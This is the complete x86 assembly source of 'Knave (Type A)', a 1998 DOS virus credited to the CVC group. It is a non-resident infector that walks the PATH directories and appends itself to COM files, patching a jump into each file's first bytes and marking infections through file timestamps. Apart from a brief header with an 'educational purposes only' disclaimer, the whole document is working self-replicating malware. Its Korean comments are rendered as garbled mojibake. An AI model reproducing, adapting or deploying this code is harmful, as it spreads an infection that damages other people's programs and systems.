;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;					       \\\\\\\	\	\   \\\\\\\
;                                             \          \     \   \
;          Knave  (Type A)                    \           \   \    \    98/05
;					      \ 	   \ \	   \
;                                              \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : Knave
; Author     : Red_Devils
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/25
; Type       : Non Resident COM
;
;   !*< ¤óŸI¸â ·¢ >********************************************************!
;   *                                                                        *
;   * ‰w‰¡ !                                                                 *
;   *        ·¡ ¸÷¥¡“e Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡ Ðs“¡”a. ¶Ÿ¡“e ·¡      *
;   *        ¸÷¥¡Ÿi ¬a¶wÐ¬á ¤i¬—Ða“e ´á˜å ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g    *
;   *        ¯s“¡”a. ¡¡—e À‚·±·e ‹i·i ·ª“e ¬aœqµA‰A ·¶¯s“¡”a.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; Miny2 (Type E) Ÿi  ˆœ·Ð–”a. Miny2 µÁ“e ¸åÑa ”aŸe ¤w¯¢·a¡ ¸b•·–E”a.
;
; 1. PATH Ÿi ·¡¶wÐ¬á ˆqµq ¯¡Ç© Ìa·©·i Àx“e”a.
; 2. ­A‹a åËa ¥e‰w·i É·Ð¬á •IÈa µ¡Ïa­U·i ŠÐi Ï©¶aˆa ´ô”a.
;
; ·¡¤å ¤á¸å·e ®á¶… ·¡ÐŸi ¶áÐ¬á ¥i”aŸe ‹¡Ša“e ¬a¶wÐa»¡ ´g´v”a. ”â¦…µA ·©¦ ·¥
; ‰·»¡“wˆñ¬aµA¬á »¥”e–A‹¥ Ða»¡ e, ¬w”wÓ¡  g·e AV µA¬á“e ´a¢ˆõ•¡ »¥”eÐa»¡ ¡µÐe
; ”a.
;
; PATH Ÿi ¬a¶wÐa‹¡ ¶áÐ¬á –ˆa»¡ Ðq®Ÿi ¬a¶wÐe”a.
;
; Get_PathAddress : ÑÅ‰wµwµbµA¬á PATH= Ÿi Àx´a¬á Àõ¤å¼ —¡BÉ¡Ÿ¡Ÿi ˆaŸaÇ¥”a.
; Use_Path        : ÑÅ‰wµwµb· ‰w¡Ÿi ¤áÌá¡ ¥¢¬aÐa‰¡ ”a·q ‰w¡Ÿi ˆaŸaÇ¥”a.
;
; ! Knave (Type A) : ‰w¡µA¬á COM Ìa·© ˆqµq
;
;
; AV Test :
; Heuristic Test :
;
;
; TK-MAN : ALT-X ¦…¬â·¡ •¡¶‘·¡ –A´ö¯s“¡”a. !
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL   TINY
            .CODE
            .286
            org   0h

 VIRLEN     equ   (End_Virus - Knave)   ; ¤a·¡œá¯a ‹©·¡

 Knave:
            mov   ax,cs                 ;
 AddSeg:    add   ax,0010h              ; ¤a·¡œá¯aˆa ¬¡¶… ­A‹a åËa µA¬á ¯¡¸b
            push  ax                    ; –A•¡¢ ‰¡Ã¥”a.
            mov   ax,offset New_Segment ;
            push  ax                    ;
            retf                        ;

 New_Segment:
            push  cs                    ;
            pop   ds                    ; cs=ds

            mov   OldSegment, es        ; ¶¥œ ­A‹a åËa ¸á¸w
            mov   ax, word ptr es:[002Ch]
            mov   Enviraddr,ax

            push  cs                    ;
            pop   es                    ;

            mov   si, offset Com_Head   ; ´|¦¦… ¥¢Š
            mov   di, offset Com_Head2  ; ¸q¯¡ ¥¢¬a
            movsw
            movsw

            mov   ah,19h                ;
            int   21h
            add   al,'A'
            mov   byte ptr OldDir, al
            mov   word ptr OldDir+1,'\:'

            mov   ah,47h
            xor   dl,dl                 ; µ• —¡BÉ¡Ÿ¡ ¸á¸w
            mov   si, offset OldDir + 3 ;
            int   21h                   ;

            mov   byte ptr Count,00     ; ˆqµqÄa¶…Èá 0

            call  Get_Path_Address      ; ‰w¡ º­¡ ´è‹¡

            mov   ah,2fh                ; DTA º­¡ ´è‹¡
            int   21h
            push  es
            push  bx

            push  cs
            pop   es

            mov   ah,1ah                ;
            mov   dx, offset NewDTA     ; ¬¡¶… DTA »¡¸÷
            int   21h

 FindFirst:
            mov   ah,4Eh                ; Ìa·© Àx‹¡
            mov   cx,00100011B          ; Ìa·© ­¢¬÷
            lea   dx,Match_COM          ; Àx‰¡¸a Ða“e Ìa·© (*.c?m)
 Find:      int   21h
            jnc   callInfect            ; µAœá¡e ”aŸe ‰w¡¡ ·¡•·
            call  Use_PATH
            cmp   al, 0FFh              ; No More Path ?
            jz    Set_OldDir
            jmp   FindFirst
 callInfect:
            call  ChkInfected           ; ˆqµq žË¥ Ñ¡Â‰
            cmp   byte ptr Count,3      ; 3 ˆ ˆqµq ¯¡Åva ?
            jz    Set_OldDir            ; ‹aœá¡e ˆqµq ÑÉ•· {
            mov   ah,4Fh                ; ”a·q Ìa·© Àx‹¡
            jmp   Find

 Set_OldDir:
            mov   ah, 0Eh
            mov   dl, byte ptr OldDir
            sub   dl, 'A'
            int   21h

            mov   ah,3Bh                ; ¶¥œ —¡BÉ¡Ÿ¡¡ ·¡•·
            lea   dx, OldDir
            int   21h

            pop   dx
            pop   ds
            mov   ah, 1Ah               ;
            int   21h

            push  cs
            pop   ds

            mov   ax, word ptr OldSegment
            mov   es,ax
            push  ax
            mov   ax,100h
            push  ax
            mov   si, offset Com_Head2  ; COM ´|¦¦… ¥¢Š
            mov   di,0FFh
            inc   di
            movsw                       ; ´|¦¦… 4 ¤a·¡Ëa ¥¢Š
            movsw                       ;
            xor   ax,ax
            push  es
            pop   ds
            retf                        ; ¶¥œ COM Ìa·© ¯©Ð—

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; ‹¡“w : PathAddr µA ¸á¸w–E º­¡ˆt·i PathBuffer ¡ ¥¢¬aÐeÒ Ð”w —¡BÉ¡Ÿ¡¡
;        ·¡•·Ðe”a. PathAddr ·¡ 0 ·¡¡e ”á·¡¬w· ‰w¡ˆa ´ô”a.
;
; ·³b : None
; Ÿ¡Èå : ¸÷  ¬w : Ð”w PATH ¡ ·¡•·
;        µAœá¯¡ : AL = FFh
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 Use_PATH   proc  near                  ; ”á·¡¬w ¬a¶wÐi ‰w¡ˆa
            push  ds
            mov   al, 0FFh
            cmp   word ptr PathAddr,0000; ´ô“eˆa?
            jz    Use_Path_Exit
            xor   al,al
 Set_PathInit:
            mov   si, word ptr PathAddr ; ‰w¡ ¶áÃ¡ µ¡Ïa­U
            mov   ds, word ptr EnvirAddr; ÑÅ‰wµbµb º­¡
            mov   di, offset PathBuffer ; Ìa·© ·¡Ÿq

 UP_Loop:   lodsb                       ;
            dec   al
            cmp   AL, ';'-1             ; —¡BÉ¡Ÿ¡ Š¥i·¥ˆa?
            jz    UP_01
            cmp   al,0FFh               ; PATH {·¥ˆa?
            jz    NomorePATH
            inc   al
            stosb                       ; ¥¢¬a
            jmp   UP_Loop

 NomorePATH:
            xor   si,si                 ; ”á·¡¬w· —¡BÉ¡Ÿ¡ˆa ´ô”a.

 UP_01:     mov   word ptr CS:PathAddr,SI    ; ‰w¡ º­¡ˆt
            xor   al,al
            stosb
            push  cs
            pop   ds

            mov   ah, 0Eh
            mov   dl, byte ptr PathBuffer
            sub   dl, 'A'
            int   21h
            jc    Use_Path

            pusha
            mov   si, offset PathBuffer
 print_loop:
            lodsb
            mov   ah,2
            mov   dl,al
            int   21h
            or    dl,dl
            jnz   print_loop
            popa

            mov   ah,3Bh                ; Ð”w —¡BÉ¡Ÿ¡¡ ·¡•·
            mov   dx, offset PathBuffer
            Int   21h
            jc    Use_Path
 Use_Path_Exit:
            pop   ds
            ret
 Use_Path   endp

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; ¯©¹A ¤a·¡œá¯a ˆqµq žË¥
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 ChkInfected:                           ; ˆqµq µa¦Ÿi ÑÂ·¥Ðe”a.
            cmp   word ptr NewDTA+1Eh,'OC' ; COMMAND.COM ·¥ˆa ?
            jz    Skip_thisfile
            mov   al,NewDTA+16h         ; 62 Á¡ ·¥»¡ ˆñ¬aÐe”a.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
 Skip_thisfile:
            RET                         ; 62 Á¡ ·¡¡e ”a·q Ìa·© ˆñ¬a¡ ·¡´á»±

 Infect:    mov   ax, 4301h             ; ·ª‹¡/³a‹¡ ­¢¬÷·a¡ ¤aŽ‘
            xor   cx,cx
            mov   dx, offset NewDta+1Eh
            int   21h
            jc    Skip_thisfile         ; µAœá ¤i¬—

            mov   ax, 3D02h             ; Ìa·© µ¡Ïe
            int   21h
            jc    Skip_thisfile         ;

            xchg  ax,bx                 ; BX = Ìa·©Ð…—i

            mov   ax, 5700h             ; Ìa·© ¸b¬÷ ¯¡ˆe ´è‹¡
            int   21h
            push  cx                    ; ¸b¬÷ ¯¡ˆe ¸á¸w
            push  dx                    ;

            mov   ah, 3Fh               ; ´|¦¦… ·ª‹¡
            lea   dx, COM_Head          ; ¤áÌá º­¡
            mov   cx, 0004              ; 4 ¤a·¡Ëa
            int   21h

            cmp   byte ptr COM_Head+1,'Z'
            jnz   lseek2                ; EXE Ìa·© ·¥ˆa ?
            nop
            cmp   byte ptr COM_Head,'M'
            jz    error

 lseek2:
            mov   al,02                 ; Ìa·© {·a¡ ·¡•·
            call  lseek
            or    dx,dx                 ; 64 KB ·¡¬w·¥ˆa ?
            jnz   Error                 ; ”a·q ˆñ¬a˜ µ¡Ïe ¯¡Ç¡»¡ ´g‹¡¶áÐ¬á

            mov   dx,ax
            add   dx,0Fh                ; 16 · ¤®¡  e—e”a.
            and   dx,0FFF0h
            mov   al, 0
            call  lseek1

            push  ax
            mov   cl,04                 ; ­A‹a åËa ‰¬e (‹©·¡/16) = ­A‹a åËa
            shr   ax,cl
            add   ax,10h
            mov   word ptr AddSeg+1, ax
            pop   ax                    ;

            sub   ax,3                  ; ¸ñÏaˆt ‰¬e
            mov   word ptr JumpCode+1,ax;

            mov   ah, 40h               ; ¤a·¡œá¯a ³a‹¡
            mov   cx, VIRLEN
            mov   dx, offset Knave
            int   21h

            mov   al,00                 ; Àá·q·a¡ ·¡•·
            call  lseek

            mov   ah, 40h               ; ¸ñÏa Å¡—a ³a‹¡
            mov   cx,0004
            mov   byte ptr JumpCode,0EAh
            dec   byte ptr JumpCode     ; E9h = JMP
            mov   dx, offset JumpCode
            int   21h

            inc   byte ptr Count        ; ˆqµq ˆ•® »wˆa
 Error:
            pop   dx                    ; Ìa·© ¸b¬÷ ¯¡ˆe ¥¢Š
            pop   cx                    ;
            or    cx,+1Fh               ; 62 Á¡¡  e—i‹¡
            mov   ax, 5701h             ; Ìa·© ¸b¬÷ ¯¡ˆe ¥¢Š
            int   21h

            mov   ah, 3Eh               ; Ìa·© ”h‹¡
            int   21h
            RET

 lseek      Proc  Near                  ; Í¡·¥Èá ·¡•·
            xor   dx,dx
 lseek1:
            xor   cx,cx
            mov   ah,40h                ; AH=42h
            inc   ah                    ;
            inc   ah
            int   21h
            ret
 lseek      Endp

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;                     ÑÅ‰w µwµbµA¬á PATH= ¶áÃ¡ ´è‹¡
;
; EnvirAddr  : ÑÅµwµwµb º­¡ˆt
; PathAddr   : ¬a¶wÐi ‰w¡· º­¡
; PathBuffer : —¡BÉ¡Ÿ¡Ÿi µ«‹¡‹¡ ¶áÐ ¬a¶w–A“e ‰w¡ ¤áÌá
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 Get_PATH_Address   Proc Near
            pusha
            push    ds
            mov     DS, word ptr EnvirAddr  ; ÑÅ‰wµwµb º­¡ˆt
            xor     si,si
            mov     cx, 5000h           ; ¤e¥¢ÒU®
 Search_PATH:
            lodsb                       ; Àx“e ¢…¸aµi 'PATH='
            cmp     AL,'P'              ; 'P' Ÿi Àx´va ?
            jnz     SP_Loop
            mov     ax,DS:[SI]
            cmp     ax,'TA'             ; TA ?
            jnz     SP_Loop
            cmp     word ptr DS:[SI+2],'=H'    ; H= (PATH=)
            jz      SavePATH
 SP_Loop:   loop    Search_PATH
 SavePATH:  add     SI,0004             ; SI “e ‰w¡Ÿi ˆaŸaÇ¡‰¡ ·¶”a.
            mov     word ptr CS:PathAddr,SI    ; ‰w¡· º­¡
            mov     DI, offset PathBuffer
            pop     ds
            popa
            RET

 Get_PATH_Address   Endp

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
; Data µwµb
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 COM_head   db    0CDh,20h,90h,90h      ; COM ´|¦¦…
 Match_COM  db    '*.c?m',00            ; COM Ìa·© Àx‹¡
 Virus_Name db    '[Knave] Type.A  by Red_Devils/CVC,Corea 98/04'
 End_Virus:                             ; ¯©¹A °á»¡“e ¤a·¡œá¯a {

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
; Ìa·©µA“e ¸á¸w–A»¡ ´g“e ¦¦…
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 COM_Head2  db    00,00,00,00           ; ·±¯¡ COM ´|¦¦…
 EnvirAddr  dw    ?                     ; ÑÅ‰w µwµb º­¡
 PathAddr   dw    ?                     ; ‰w¡ º­¡
 OldSegment dw    ?                     ; ¶¥œ ­A‹a åËa
 Count      db    ?                     ; ˆqµq ˆ•®
 JumpCode   db    0E9h,00,00,00         ; ¸ñÏa ˆt
 PathBuffer db    80h dup ('$')         ;
 NewDTA     db    80h dup (00)          ; ¬¡¶… DTA µwµb
 OldDir     db    80h dup (00)          ; µ• —¡BÉ¡Ÿ¡ ¸á¸w ¸w­¡

            END   Knave

